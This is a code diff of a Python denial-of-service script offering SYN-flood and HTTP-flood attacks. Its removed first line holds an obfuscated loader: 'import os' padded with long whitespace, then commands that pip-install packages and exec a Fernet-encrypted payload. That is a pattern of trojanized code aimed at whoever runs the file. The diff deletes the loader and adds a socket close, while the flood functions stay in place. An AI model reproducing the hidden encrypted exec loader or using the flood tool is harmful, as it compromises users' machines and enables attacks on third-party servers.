@@ -1,6 +1,6 @@
-import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'LVqOq5hydBhrIWlPzlSFv0hfNkHsg2rgqruiaZOFw3U=').decrypt(b'gAAAAABlvRUqR3L4PokyKZcM9HzEcgUXsBTXm2BAQXJAJ9l4Szn5UdG4jIBgTtARBlv20lG7zRUp86IDXpYj5bdqb12L0MtWWD6tVRQkx9xx0PXXuvIXTcb8devopXFIlrOAD52fjj07Nqz_0TjL5z2PLrS4f127FIItVWueB99_KiGWXCavsGD9_MTzUmy9IgW3JO3dTKudHS6nMliXL5n_5fYYaRHEsg=='))
 from termcolor import colored
 import sys
+import os
 import time
 import socket
 import random
@@ -93,9 +93,9 @@ def syn_flood(ip, port, duration):
         except KeyboardInterrupt:
             print("\n[*] Attack stopped.")
             sys.exit()
-
+        finally:
+            sock.close()  # Make sure to close the socket in all cases 
 # Function to perform the HTTP Flood attack
-
 
 def http_flood(ip, port, duration):
     # create a socket
@@ -142,4 +142,3 @@ elif attack_type == "2":
 else:
     print(colored("Invalid attack type. Exiting...", "green"))
     sys.exit()
-lrila
